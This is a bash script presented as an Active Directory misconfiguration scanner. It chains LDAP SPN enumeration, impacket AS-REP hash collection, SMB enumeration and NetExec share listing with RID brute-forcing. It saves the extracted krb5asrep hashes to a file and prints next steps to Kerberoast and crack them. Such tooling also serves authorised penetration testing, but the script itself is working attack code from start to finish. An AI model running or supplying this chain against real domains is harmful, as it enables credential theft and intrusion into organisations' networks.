#!/usr/bin/env bash

set -e

# --- Colors ---
R="\033[0;31m"; G="\033[0;32m"; Y="\033[1;33m"; N="\033[0m"

# --- Banner ---
echo -e "${G}AD Misconfig Scanner${N}"

# --- Args ---
while getopts "t:d:u:p:o:" opt; do
  case $opt in
    t) TARGET=$OPTARG ;;
    d) DOMAIN=$OPTARG ;;
    u) USER=$OPTARG ;;
    p) PASS=$OPTARG ;;
    o) OUT=$OPTARG ;;
  esac
done

if [[ -z "$TARGET" || -z "$DOMAIN" || -z "$USER" ]]; then
  echo -e "${R}Usage:${N} $0 -t <target> -d <domain> -u <user> -p <pass>"
  exit 1
fi

OUT=${OUT:-"scan_$(date +%s)"}
mkdir -p "$OUT"

# --- Dependency Check ---
echo -e "${Y}[*] Checking dependencies...${N}"
for cmd in ldapsearch impacket-GetNPUsers enum4linux-ng; do
  if ! command -v $cmd &>/dev/null; then
    echo -e "${R}[!] Missing: $cmd${N}"
  fi
done

# --- LDAP SPN ---
echo -e "${Y}[*] LDAP SPN enumeration...${N}"
BASE_DN=$(echo $DOMAIN | sed 's/\./,dc=/g')
ldapsearch -x -H ldap://$TARGET \
-D "$USER@$DOMAIN" -w "$PASS" \
-b "dc=$BASE_DN" "(servicePrincipalName=*)" \
> "$OUT/ldap_spn.txt" 2>/dev/null || true

# --- Kerberos AS-REP ---
echo -e "${Y}[*] Kerberos AS-REP scan...${N}"
impacket-GetNPUsers "$DOMAIN/$USER:$PASS@$TARGET" -no-pass \
> "$OUT/asrep.txt" 2>/dev/null || true

grep -i "krb5asrep" "$OUT/asrep.txt" > "$OUT/asrep_hashes.txt" || true

# --- SMB Enum ---
echo -e "${Y}[*] SMB enumeration...${N}"
enum4linux-ng -A "$TARGET" > "$OUT/smb_enum.txt" 2>/dev/null || true

# --- NetExec ---
if command -v nxc &>/dev/null; then
  echo -e "${Y}[*] NetExec enumeration...${N}"
  nxc smb "$TARGET" -u "$USER" -p "$PASS" --shares \
  > "$OUT/nxc_shares.txt" 2>/dev/null || true

  nxc smb "$TARGET" -u "$USER" -p "$PASS" --rid-brute \
  > "$OUT/rid.txt" 2>/dev/null || true
fi

# --- Analysis ---
echo -e "${Y}[*] Analyzing findings...${N}"

SPN_COUNT=$(grep -c "servicePrincipalName" "$OUT/ldap_spn.txt" || echo 0)
ASREP_COUNT=$(wc -l < "$OUT/asrep_hashes.txt" 2>/dev/null || echo 0)

# --- JSON Report ---
JSON="$OUT/report.json"
cat <<EOF > "$JSON"
{
  "target": "$TARGET",
  "domain": "$DOMAIN",
  "spn_accounts": $SPN_COUNT,
  "asrep_roastable": $ASREP_COUNT
}
EOF

# --- HTML Report ---
HTML="$OUT/report.html"
cat <<EOF > "$HTML"
<html>
<head><title>AD Scan Report</title></head>
<body>
<h1>AD Misconfiguration Report</h1>
<p><b>Target:</b> $TARGET</p>
<p><b>Domain:</b> $DOMAIN</p>
<p><b>SPN Accounts:</b> $SPN_COUNT</p>
<p><b>AS-REP Roastable Users:</b> $ASREP_COUNT</p>
</body>
</html>
EOF

# --- Summary ---
echo -e "${G}[+] Scan Completed${N}"
echo -e "${G}[+] Output:${N} $OUT"
echo ""
echo -e "${G}[+] Findings:${N}"
echo "- SPN Accounts: $SPN_COUNT"
echo "- AS-REP Roastable: $ASREP_COUNT"
echo ""
echo -e "${Y}[>] Next Steps:${N}"
echo "- Kerberoasting (SPN accounts)"
echo "- Crack AS-REP hashes"
echo "- Review SMB shares"